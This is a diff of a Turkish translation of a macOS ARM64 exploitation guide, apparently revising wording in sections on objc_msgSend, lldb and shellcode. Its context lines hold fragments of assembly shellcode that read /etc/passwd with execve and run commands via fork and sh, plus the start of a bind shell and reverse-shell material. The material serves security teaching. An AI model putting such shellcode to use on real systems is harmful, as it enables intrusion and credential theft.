 - x0: self -> Instance'a pointer
 - x1: op -> Method'un selector'ı
-- x2... -> Invoked method'un kalan argument'ları
+- x2... -> Invoked method'un diğer arguments'ları
 
-Dolayısıyla, bu function'a branch yapılmadan önce breakpoint koyarsanız, aşağıdaki örnekte olduğu gibi lldb içinde neyin invoke edildiğini kolayca bulabilirsiniz (bu örnekte object, bir command çalıştıracak olan `NSConcreteTask` içindeki bir object'i çağırır):
+Dolayısıyla, bu function'a branch işleminden önce breakpoint koyarsanız, aşağıdaki komutla lldb içinde neyin invoke edildiğini kolayca bulabilirsiniz (bu örnekte object, bir command çalıştıracak olan `NSConcreteTask` içindeki bir object'i çağırır):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -386,25 +386,25 @@ whoami
 > [!TIP]
 > Env variable **`NSObjCMessageLoggingEnabled=1`** ayarlanarak, bu function'ın çağrıldığı zamanı `/tmp/msgSends-pid` gibi bir file'a loglamak mümkündür.
 >
-> Ayrıca **`OBJC_HELP=1`** ayarlanıp herhangi bir binary çağrıldığında, belirli Objc-C action'ları gerçekleştiğinde bunları **log** etmek için kullanabileceğiniz diğer environment variable'ları görebilirsiniz.
+> Ayrıca **`OBJC_HELP=1`** ayarlanıp herhangi bir binary çağrıldığında, belirli Objc-C action'ları gerçekleştiğinde **log** almak için kullanabileceğiniz diğer environment variable'ları görebilirsiniz.
 
-Bu function çağrıldığında, belirtilen instance'ın çağrılan method'unu bulmak gerekir; bunun için farklı aramalar gerçekleştirilir:
+Bu function çağrıldığında, belirtilen instance'ın çağrılan method'unu bulmak gerekir; bunun için farklı aramalar yapılır:
 
 - Optimistic cache lookup gerçekleştirilir:
 - Başarılıysa işlem tamamlanır
 - runtimeLock (read) alınır
-- (realize && !cls->realized) ise class realize edilir
-- (initialize && !cls->initialized) ise class initialize edilir
+- (`realize && !cls->realized`) ise class realize edilir
+- (`initialize && !cls->initialized`) ise class initialize edilir
 - Class'ın kendi cache'i denenir:
 - Başarılıysa işlem tamamlanır
-- Class method list denenir:
+- Class method listesi denenir:
 - Bulunursa cache doldurulur ve işlem tamamlanır
-- Superclass cache denenir:
+- Superclass cache'i denenir:
 - Başarılıysa işlem tamamlanır
-- Superclass method list denenir:
+- Superclass method listesi denenir:
 - Bulunursa cache doldurulur ve işlem tamamlanır
-- (resolver) ise method resolver denenir ve class lookup'tan tekrar başlanır
-- Hâlâ buradaysa (= diğer tüm yöntemler başarısız olduysa) forwarder denenir
+- (`resolver`) ise method resolver denenir ve class lookup'tan itibaren tekrarlanır
+- Hâlâ buradaysa (= diğer tüm seçenekler başarısız olduysa) forwarder denenir
 
 ### Shellcodes
 
@@ -432,7 +432,7 @@ done
 ```
 <details>
 
-<summary>Shellcode'u test etmek için C kodu</summary>
+<summary>shellcode'u test etmek için C kodu</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -482,7 +482,7 @@ return 0;
 
 #### Shell
 
-[**Buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.<sup>[1]</sup>
+[**Buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.<sup>[[1]](#references)</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -552,9 +552,9 @@ sh_path: .asciz "/bin/sh"
 {{#endtab}}
 {{#endtabs}}
 
-#### cat ile okuma
+#### cat ile oku
 
-Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır; bu nedenle ikinci argüman (x1), parametrelerden oluşan bir dizidir (bellekte bu, adreslerden oluşan bir stack anlamına gelir).
+Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır; bu nedenle ikinci argüman (x1), bir parametre dizisidir (bellekte bu, adreslerden oluşan bir stack anlamına gelir).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -580,7 +580,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Ana process'in öldürülmemesi için fork üzerinden sh ile command çalıştır
+#### Ana işlemin sonlandırılmaması için fork'tan sh ile komut çağırma
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -626,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) adresindeki **4444 portundaki** Bind shell<sup>[2]</sup>
+[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kaynağındaki **port 4444** üzerindeki Bind shell<sup>[[2]](#references)</sup>.
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -710,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
-[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) adresinden, **127.0.0.1:4444** adresine revshell<sup>[3]</sup>.
+[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) adresinden, **127.0.0.1:4444** adresine revshell<sup>[[3]](#references)</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
